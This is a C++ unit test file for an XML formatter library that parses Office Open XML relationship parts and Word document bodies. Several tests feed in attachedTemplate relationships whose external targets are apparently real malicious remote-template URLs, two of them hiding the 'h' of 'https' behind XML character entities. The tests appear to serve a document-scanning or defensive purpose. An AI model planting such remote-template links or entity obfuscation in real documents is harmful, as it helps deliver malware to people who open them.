#include "stdafx.h"

struct ST_RELATIONSHIP : public IFormatterObject
{
	std::tstring strId;
	std::tstring strType;
	std::tstring strTarget;
	std::tstring strTargetMode;

	void OnSync(core::IFormatter& formatter)
	{
		formatter
			+ core::sPair(TEXT("Id"), strId)
			+ core::sPair(TEXT("Type"), strType)
			+ core::sPair(TEXT("Target"), strTarget)
			+ core::sPair(TEXT("TargetMode"), strTargetMode)
			;
	}
};

struct ST_RELATIONSHIPS : public IFormatterObject
{
	std::tstring strXmlNs;
	std::vector<ST_RELATIONSHIP> vecRelationship;

	void OnSync(IFormatter& formatter)
	{
		formatter
			+ sPair(TEXT("xmlns"), strXmlNs)
			+ sPair(TEXT("Relationship"), vecRelationship)
			
			;
	}
};

struct ST_RELS : public IFormatterObject
{
	std::tstring strVersion;
	ST_RELATIONSHIPS Relationships;

	void OnSync(IFormatter& formatter)
	{
		formatter
			+ sPair(TEXT("version"), strVersion)
			+ sPair(TEXT("Relationships"), Relationships)
			;
	}
};

TEST(FormatterTest, XmlSimpleTest)
{
	std::tstring strContext = TEXT("<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\"?><Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\" Target=\"http://outlooksyn.com/FpUCu5h6W2/R/YHXCCUK7bk34tzd6GA2AAAATqzjlQ4FwFifvY2EpuSOyN+L1n/16mONopqdw8+w6xh4qXcxhOLWxvIZbHxRr6y5A/kdSgdL\" TargetMode=\"External\" /></Relationships>");
	
	ST_RELATIONSHIPS stRels;
	std::tstring strErrMsg;
	EXPECT_TRUE(ReadXmlFromString(&stRels, strContext, &strErrMsg));
	EXPECT_TRUE(!stRels.strXmlNs.empty());
}

TEST(FormatterTest, XmlSimpleTest2)
{
	std::tstring strContext = TEXT("<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\"?>  \r\n<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\" Target=\"http://outlooksyn.com/FpUCu5h6W2/R/YHXCCUK7bk34tzd6GA2AAAATqzjlQ4FwFifvY2EpuSOyN+L1n/16mONopqdw8+w6xh4qXcxhOLWxvIZbHxRr6y5A/kdSgdL\" TargetMode=\"External\" /></Relationships>");

	ST_RELATIONSHIPS stRels;
	std::tstring strErrMsg;
	EXPECT_TRUE(ReadXmlFromString(&stRels, strContext, &strErrMsg));
	EXPECT_TRUE(!stRels.strXmlNs.empty());
}

TEST(FormatterTest, XmlSimpleTest3)
{
	std::tstring strContext = 
		TEXT("<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>")
		TEXT("<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">")
		TEXT("	<Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\" Target=\"&#104;ttps://viviendas8.com/bb/qhrx1h.dotm\" TargetMode=\"External\"/>")
		TEXT("</Relationships>")
		;

	ST_RELATIONSHIPS stRels;
	std::tstring strErrMsg;
	EXPECT_TRUE(ReadXmlFromString(&stRels, strContext, &strErrMsg));
	ASSERT_FALSE(stRels.vecRelationship.empty());
	EXPECT_EQ(TEXT("https://viviendas8.com/bb/qhrx1h.dotm"), stRels.vecRelationship[0].strTarget);
}

TEST(FormatterTest, XmlSimpleTest4)
{
	std::tstring strContext =
		TEXT("<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>")
		TEXT("<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">")
		TEXT("	<Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\" Target=\"&#x68;ttps://viviendas8.com/bb/qhrx1h.dotm\" TargetMode=\"External\"/>")
		TEXT("</Relationships>")
		;

	ST_RELATIONSHIPS stRels;
	std::tstring strErrMsg;
	EXPECT_TRUE(ReadXmlFromString(&stRels, strContext, &strErrMsg));
	ASSERT_FALSE(stRels.vecRelationship.empty());
	EXPECT_EQ(TEXT("https://viviendas8.com/bb/qhrx1h.dotm"), stRels.vecRelationship[0].strTarget);
}

struct ST_WORD_ROW : core::IFormatterObject
{
	std::tstring strText;
	void OnSync(core::IFormatter& formatter)
	{
		formatter
			+ core::sPair(TEXT("w:t"), strText)
			;
	}
};

struct ST_WORD_PARAGRAPH : core::IFormatterObject
{
	std::vector<ST_WORD_ROW> vecRows;
	void OnSync(core::IFormatter& formatter)
	{
		formatter
			+ core::sPair(TEXT("w:r"), vecRows)
			;
	}
};

struct ST_WORD_BODY : core::IFormatterObject
{
	std::vector<ST_WORD_PARAGRAPH> vecParagraphs;
	void OnSync(core::IFormatter& formatter)
	{
		formatter
			+ core::sPair(TEXT("w:p"), vecParagraphs)
			;
	}
};

struct ST_WORD_DOCUMENT : core::IFormatterObject
{
	ST_WORD_BODY Body;
	void OnSync(core::IFormatter& formatter)
	{
		formatter
			+ core::sPair(TEXT("w:body"), Body)
			;
	}
};

TEST(FormatterTest, XmlSimpleTest5)
{
	ST_WORD_DOCUMENT Doc;
	std::tstring strErrMsg;
	EXPECT_TRUE(ReadXmlFromString(&Doc, TEXT("<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><w:document xmlns:wpc=\"http://schemas.microsoft.com/office/word/2010/wordprocessingCanvas\" xmlns:mc=\"http://schemas.openxmlformats.org/markup-compatibility/2006\" xmlns:o=\"urn:schemas-microsoft-com:office:office\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\" xmlns:m=\"http://schemas.openxmlformats.org/officeDocument/2006/math\" xmlns:v=\"urn:schemas-microsoft-com:vml\" xmlns:wp14=\"http://schemas.microsoft.com/office/word/2010/wordprocessingDrawing\" xmlns:wp=\"http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing\" xmlns:w10=\"urn:schemas-microsoft-com:office:word\" xmlns:w=\"http://schemas.openxmlformats.org/wordprocessingml/2006/main\" xmlns:w14=\"http://schemas.microsoft.com/office/word/2010/wordml\" xmlns:w15=\"http://schemas.microsoft.com/office/word/2012/wordml\" xmlns:wpg=\"http://schemas.microsoft.com/office/word/2010/wordprocessingGroup\" xmlns:wpi=\"http://schemas.microsoft.com/office/word/2010/wordprocessingInk\" xmlns:wne=\"http://schemas.microsoft.com/office/word/2006/wordml\" xmlns:wps=\"http://schemas.microsoft.com/office/word/2010/wordprocessingShape\" mc:Ignorable=\"w14 w15 wp14\"><w:body><w:p w:rsidR=\"00605EFF\" w:rsidRPr=\"00605EFF\" w:rsidRDefault=\"00605EFF\" w:rsidP=\"005949C1\"><w:pPr><w:rPr><w:b/></w:rPr></w:pPr><w:r w:rsidRPr=\"00605EFF\"><w:rPr><w:rFonts w:hint=\"eastAsia\"/><w:b/></w:rPr><w:t>First,</w:t></w:r><w:r w:rsidRPr=\"00605EFF\"><w:rPr><w:b/></w:rPr><w:t xml:space=\"preserve\"> </w:t></w:r></w:p></w:body></w:document>"), &strErrMsg));

	std::tstring strBodyContext;
	for (const auto& p : Doc.Body.vecParagraphs)
	{
		for (const auto& r : p.vecRows)
		{
			strBodyContext += r.strText;
		}
		strBodyContext += TEXT("\n");
	}

	EXPECT_EQ(TEXT("First, \n"), strBodyContext);
}
